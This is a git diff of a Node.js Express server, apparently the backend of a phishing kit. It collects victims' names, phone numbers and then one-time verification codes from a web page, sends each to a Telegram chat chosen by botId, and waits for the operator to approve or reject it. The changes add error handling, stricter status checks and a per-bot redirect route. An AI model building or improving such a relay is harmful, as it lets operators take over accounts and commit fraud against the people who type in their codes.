@@ -32,28 +32,33 @@ Object.keys(process.env).forEach(key => {
 app.use(express.json());
 app.use(express.static('public'));
 
+// ---------------- BOT FETCH ----------------
 function getBot(botId) {
     return bots.find(b => b.botId === botId);
 }
 
 // ---------------- TELEGRAM ----------------
 async function sendTelegram(bot, payload) {
-    await axios.post(
-        `https://api.telegram.org/bot${bot.botToken}/sendMessage`,
-        {
-            chat_id: bot.chatId,
-            text: payload.text,
-            reply_markup: payload.reply_markup
-        }
-    );
+    try {
+        await axios.post(
+            `https://api.telegram.org/bot${bot.botToken}/sendMessage`,
+            {
+                chat_id: bot.chatId,
+                text: payload.text,
+                reply_markup: payload.reply_markup
+            }
+        );
+    } catch (err) {
+        console.error("Telegram error:", err.response?.data || err.message);
+    }
 }
 
-// ---------------- PHONE STEP ----------------
+// ---------------- PHONE ----------------
 app.post('/submit-phone', async (req, res) => {
     const { name, phone, botId } = req.body;
 
     const bot = getBot(botId);
-    if (!bot) return res.status(400).json({ error: "Invalid bot" });
+    if (!bot) return res.status(400).json({ error: "Invalid botId" });
 
     const requestId = uuidv4();
     phoneStatus[requestId] = null;
@@ -74,17 +79,20 @@ app.post('/submit-phone', async (req, res) => {
 });
 
 app.get('/check-phone/:id', (req, res) => {
+    const id = req.params.id;
+
     res.json({
-        approved: phoneStatus[req.params.id] ?? null
+        approved: phoneStatus[id] === true ? true :
+                 phoneStatus[id] === false ? false : null
     });
 });
 
-// ---------------- CODE STEP ----------------
+// ---------------- CODE ----------------
 app.post('/submit-code', async (req, res) => {
     const { code, botId } = req.body;
 
     const bot = getBot(botId);
-    if (!bot) return res.status(400).json({ error: "Invalid bot" });
+    if (!bot) return res.status(400).json({ error: "Invalid botId" });
 
     const requestId = uuidv4();
     codeStatus[requestId] = null;
@@ -103,10 +111,15 @@ app.post('/submit-code', async (req, res) => {
 });
 
 app.get('/check-code/:id', (req, res) => {
-    res.json({ approved: codeStatus[req.params.id] ?? null });
+    const id = req.params.id;
+
+    res.json({
+        approved: codeStatus[id] === true ? true :
+                 codeStatus[id] === false ? false : null
+    });
 });
 
-// ---------------- CALLBACK ----------------
+// ---------------- WEBHOOK ----------------
 app.post('/telegram-webhook/:botId', async (req, res) => {
     const bot = getBot(req.params.botId);
     if (!bot) return res.sendStatus(404);
@@ -132,6 +145,14 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     } catch (e) {}
 
     res.sendStatus(200);
+});
+
+// ---------------- BOT ROUTE (IMPORTANT FIX) ----------------
+app.get('/bot/:botId', (req, res) => {
+    const bot = getBot(req.params.botId);
+    if (!bot) return res.status(404).send("Invalid bot");
+
+    res.redirect(`/index.html?botId=${bot.botId}`);
 });
 
 // ---------------- START ----------------
